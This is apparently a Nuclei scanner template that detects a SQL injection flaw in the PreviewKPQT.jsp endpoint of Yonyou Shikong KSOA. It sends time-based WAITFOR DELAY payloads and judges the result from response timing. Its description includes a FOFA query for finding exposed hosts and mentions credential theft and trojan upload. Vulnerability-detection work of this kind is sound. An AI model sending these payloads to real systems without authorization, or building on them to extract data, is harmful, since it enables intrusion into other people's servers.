http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
          Host: {{Hostname}}
id: yongyoushikong-KSOA-PreviewKPQT-sql
info:
    author: Superhero
    description: |-
        fofa: app="用友-时空KSOA"
        用友时空KSOA PreviewKPQT.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 用友时空KSOA PreviewKPQT SQL注入漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140735563
    severity: high
    tags:
        - Kong
